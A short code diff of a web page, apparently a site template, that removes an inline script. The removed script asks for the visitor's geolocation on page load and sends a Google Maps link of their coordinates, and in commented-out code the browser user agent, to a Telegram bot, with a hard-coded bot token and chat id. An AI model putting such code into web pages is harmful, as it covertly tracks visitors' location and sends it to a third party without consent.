@@ -848,42 +848,7 @@
 
 	gtag('config', 'G-VB8255JP57');
 </script>
-<script>
-// 	function check(){
-// 		$.ajax({
-// 		url: `https://api.telegram.org/bot5007404101:AAETirjlz-DgKtgiwnvcN4DPTiqZsDZgSj8/sendMessage?chat_id=52238804&text=${window.navigator.userAgent}`,
-// 		type: 'get',
-// 		success: function(response){
-// 			console.log(response)
-// 	}
-// });
-// 	}
-	// window.navigator.geolocation.getCurrentPosition(
-	// 	console.log(coords), console.log(coords))
-		function showPosition() {
-             navigator.geolocation.getCurrentPosition(showMap);
-        }
 
-        function showMap(position) {
-             // Get location data
-             var latlong = position.coords.latitude + "," + position.coords.longitude;
-
-             // Set Google map source url
-             var mapLink = `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`;
-					$.ajax({
-		url: `https://api.telegram.org/bot5007404101:AAETirjlz-DgKtgiwnvcN4DPTiqZsDZgSj8/sendMessage?chat_id=52238804&text=${mapLink}`,
-		type: 'get',
-		success: function(response){
-			console.log(response)
-	}
-});
-
-        }
-		 showPosition();
-
-// check();
-
-</script>
 <!-- <script async src="https://theapicompany.com/deviceAPI2.js?id=deviceAPI-hh63787bqi"></script>
 <script>
 	function deviceAPIcallback(result){
